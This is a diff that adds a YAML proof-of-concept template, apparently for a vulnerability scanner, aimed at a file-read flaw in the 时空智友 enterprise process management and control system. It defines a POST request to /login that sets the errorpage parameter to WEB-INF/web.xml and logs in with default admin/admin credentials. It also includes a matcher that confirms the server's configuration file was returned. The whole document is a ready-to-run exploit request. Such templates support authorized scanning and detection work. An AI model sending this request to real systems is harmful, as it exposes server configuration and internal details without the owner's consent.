@@ -1,0 +1,18 @@
+id: poc-yaml-skzy-enterprise-process-management-and-control-system-login-file-read
+info:
+  name: 时空智友企业流程化管控系统 login 文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 时空智友企业流程化管控系统
+requests:
+- method: POST
+  path: /login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
+  expression: status_code == 200 && contains(body,"<display-name>artery</display-name>")
+    && contains(body,"<listener-class>com.artery.portal.listener.ServletContextListener</listener-class>")&&
+    content_type == "application/xml"
+variables: {}
+transport: http
